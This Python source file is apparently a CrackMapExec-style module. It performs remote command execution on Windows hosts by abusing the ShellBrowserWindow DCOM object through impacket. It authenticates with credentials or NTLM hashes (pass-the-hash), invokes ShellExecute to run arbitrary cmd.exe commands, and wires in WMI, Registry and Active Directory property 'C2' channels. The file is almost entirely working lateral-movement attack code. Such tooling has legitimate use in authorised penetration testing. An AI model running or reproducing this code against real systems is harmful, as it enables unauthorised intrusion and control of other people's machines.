import logging
import inspect
import sys
from cme.protocols.smb.c2s import *
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
    VARIANT, VARENUM, DISPATCH_METHOD
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
    IRemUnknown2, INTERFACE
from impacket.dcerpc.v5.dtypes import NULL


class SHELLBRWEXEC(object):
    def __init__(self, command, payload, target, username, password, domain, hashes=None, retOutput=True):
        self.command = command
        self.payload = payload
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        self.outputBuffer = ''
        self.shell = 'c:\\windows\\system32\\cmd.exe'
        self.pwd = 'C:\\'
        self.quit = None
        self.executeShellCommand = None
        self.retOutput = retOutput
        self.aesKey = None
        self.doKerberos = False

        if hashes is not None:
            self.lmhash, self.nthash = hashes.split(':')

        dcom = DCOMConnection(self.target, self.username, self.password, self.domain, self.lmhash, self.nthash, None, oxidResolver=True, doKerberos=self.doKerberos)
        try:
            # ShellWindows CLSID (Windows 7, Windows 10, Windows Server 2012R2)
            #iInterface = dcom.CoCreateInstanceEx(string_to_bin('9BA05972-F6A8-11CF-A442-00A0C90A8F39'), IID_IDispatch)

            # ShellBrowserWindow CLSID (Windows 10, Windows Server 2012R2)
            iInterface = dcom.CoCreateInstanceEx(string_to_bin('C08AFD90-F2A1-11D1-8455-00A0C91F3880'), IID_IDispatch)
            iMMC = IDispatch(iInterface)

            resp = iMMC.GetIDsOfNames(('Document',))

            dispParams = DISPPARAMS(None, False)
            dispParams['rgvarg'] = NULL
            dispParams['rgdispidNamedArgs'] = NULL
            dispParams['cArgs'] = 0
            dispParams['cNamedArgs'] = 0
            resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

            iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
            resp = iDocument.GetIDsOfNames(('Application',))
            resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

            iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
            pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]

            pQuit = iMMC.GetIDsOfNames(('Quit',))[0]

            self.quit = (iMMC, pQuit)
            self.executeShellCommand = (iActiveView, pExecuteShellCommand)

        except Exception as e:
            logging.debug(str(e))
            dcom.disconnect()

        # https://stackoverflow.com/questions/44352/iterate-over-subclasses-of-a-given-class-in-a-given-module
        for k, obj in inspect.getmembers(self):
            if hasattr(obj, "__bases__"):
                for cls in obj.__bases__:
                    if cls.__name__ == 'WMI':
                        logging.debug('Using WMI C2')
                        WMI.__init__(self)

                    elif cls.__name__ == 'Registry':
                        logging.debug('Using Registry C2')
                        Registry.__init__(self)

                    elif cls.__name__ == 'ADProperty':
                        logging.debug('Using ADProperty C2')
                        ADProperty.__init__(self)

    def getInterface(self, interface, resp):
        # Now let's parse the answer and build an Interface instance
        objRefType = OBJREF(''.join(resp))['flags']
        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(''.join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(''.join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(''.join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(''.join(resp))
        else:
            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)

        return IRemUnknown2(
            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                      target=interface.get_target()))

    def execute_command(self, data):
        command = '/Q /C ' + data

        logging.debug("Command to execute: " + command)

        dispParams = DISPPARAMS(None, False)
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 5
        dispParams['cNamedArgs'] = 0
        arg0 = VARIANT(None, False)
        arg0['clSize'] = 5
        arg0['vt'] = VARENUM.VT_BSTR
        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg0['_varUnion']['bstrVal']['asData'] = self.shell

        arg1 = VARIANT(None, False)
        arg1['clSize'] = 5
        arg1['vt'] = VARENUM.VT_BSTR
        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg1['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)

        arg2 = VARIANT(None, False)
        arg2['clSize'] = 5
        arg2['vt'] = VARENUM.VT_BSTR
        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg2['_varUnion']['bstrVal']['asData'] = self.pwd

        arg3 = VARIANT(None, False)
        arg3['clSize'] = 5
        arg3['vt'] = VARENUM.VT_BSTR
        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg3['_varUnion']['bstrVal']['asData'] = ''

        arg4 = VARIANT(None, False)
        arg4['clSize'] = 5
        arg4['vt'] = VARENUM.VT_BSTR
        arg4['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg4['_varUnion']['bstrVal']['asData'] = '0'
        dispParams['rgvarg'].append(arg4)
        dispParams['rgvarg'].append(arg3)
        dispParams['rgvarg'].append(arg2)
        dispParams['rgvarg'].append(arg1)
        dispParams['rgvarg'].append(arg0)

        self.executeShellCommand[0].Invoke(
            self.executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], []
        )

        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0

        self.quit[0].Invoke(
            self.quit[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], []
        )

        return True
